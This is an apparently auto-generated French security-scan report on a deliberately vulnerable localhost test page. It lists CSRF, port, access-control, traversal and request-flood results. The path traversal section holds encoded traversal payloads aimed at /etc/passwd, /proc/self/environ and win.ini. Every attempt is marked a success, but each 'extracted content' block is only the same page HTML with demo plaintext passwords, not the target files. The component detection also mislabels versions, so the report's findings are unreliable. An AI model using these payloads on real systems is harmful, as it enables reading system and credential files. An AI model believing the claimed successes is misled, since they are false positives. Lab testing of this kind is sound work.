# Rapport des Attaques

## Analyse de l'attaque CSRF :
Succès : L'attaque CSRF a été exécutée.


## Analyse de l'attaque Nmap :
URL cible : localhost

Résultats du scan :
Ports ouverts : 80

## Analyse de l'attaque Buffer Overflow pour : http://localhost/csrf.php
Payload envoyé (100 octets).
Réponse du serveur : 200
ID de session : 2mjpq27uph6cjslsqmop4je8po<br>Utilisateur  introuvable.
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisat...


## Analyse de l'attaque Access Control :
- Accessible: http://localhost/csrf.php/admin (200 OK)
- Accessible: http://localhost/csrf.php/settings (200 OK)
- Accessible: http://localhost/csrf.php/hidden (200 OK)
- Accessible: http://localhost/csrf.php/api (200 OK)
- Accessible: http://localhost/csrf.php/dashboard (200 OK)
- Accessible: http://localhost/csrf.php/config (200 OK)
- Accessible: http://localhost/csrf.php/login (200 OK)
- Accessible: http://localhost/csrf.php/logout (200 OK)
- Accessible: http://localhost/csrf.php/register (200 OK)
- Accessible: http://localhost/csrf.php/backup (200 OK)
- Accessible: http://localhost/csrf.php/data (200 OK)
- Accessible: http://localhost/csrf.php/private (200 OK)
- Accessible: http://localhost/csrf.php/secure (200 OK)
- Accessible: http://localhost/csrf.php/test (200 OK)


## Analyse des Composants Vulnérables

URL cible : http://localhost/csrf.php
### Composants détectés :
- **PHP**: 2.4.54

### Frameworks détectés :
- **Backend Framework**: PHP/7.4.33

### Vérification des vulnérabilités :

#### PHP:
PHP: Pas de vulnérabilités connues

#### Backend Framework:
Backend Framework: Pas de vulnérabilités connues
## Path Traversal

URL cible : http://localhost/csrf.php
- Fichier cible : /etc/passwd
- Fichier cible : /etc/hosts
- Fichier cible : /windows/win.ini
- Fichier cible : /proc/self/environ
- Pattern de traversée : ../
- Pattern de traversée :  ..\
- Pattern de traversée :  ..%2f
- Pattern de traversée :  ..%5c
- Pattern de traversée :  ..%c0%af
- Pattern de traversée :  ..%u2216
- Pattern de traversée :  ..%252e%252e%255c

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : s7q2ge660f9fkr1c03dh22ud4b<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : g5cgqm75qaulsq9j840crbjt2b<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : lb7jlnv05tj9p5nqmd0jmiih08<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 1t7go9bb0ukou2vber206lh8tv<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : clth47seoutjkb8b9gfk9ekteh<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 6c5hf5e568u5hfni3k39ol4tf3<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 4dbst3n77qpgg1haom8bhj8a4j<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : j2a4cppah7k645k71hln3v2av8<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : dreq2hsfdb1d5ilpssf980sn49<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : sm3b2vtnhna2falsicqud5m8vp<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : qrnummdrskiv4hltn9t4da2iv0<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 5068rhe7jq3ibj8cop5j2quhc0<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : sj0dk0nns6r7d01ae5vvlcn6om<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : jq882hctib49ipl0jobgs5d9e2<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : jh8e8bsp50ese60iahm7u69h2f<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 5ir2bb2v1e4bafe356tucgf05a<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : aoute4rcc5pgoj172bedbe646c<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : gt284ej18mufvdj55154sndat3<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 97ojs22f1bhsufagrhac80hft6<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : mo0l39i68ev7k60h7i1cae6rib<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : ka5o3u1rv4aktqefm3kgbm47mr<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 9a9gjquejmtfgmmh0fgno04kbu<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : lod2a25989ajgpo1g9eed9ltcr<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : v7593shlkr11tvsa09e9ssf1vb<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 9vl3o3gcs0h9s046lf4tug3d4g<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 6el27dosph7i24q5liu6d81v51<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 20tfq4j1146uhbt9fdrgimisrp<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 9dfha598on2hlrtq3i151nc6j0<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

## Analyse de l'attaque DDoS
- URL cible : http://localhost/csrf.php
- Temps initial estimé : 10.00 secondes
- Temps réel de l'attaque : 10.33 secondes
- Nombre de requêtes sélectionnées : 100
- Requêtes effectuées : 100
- Intervalle entre les requêtes : 0.10 secondes


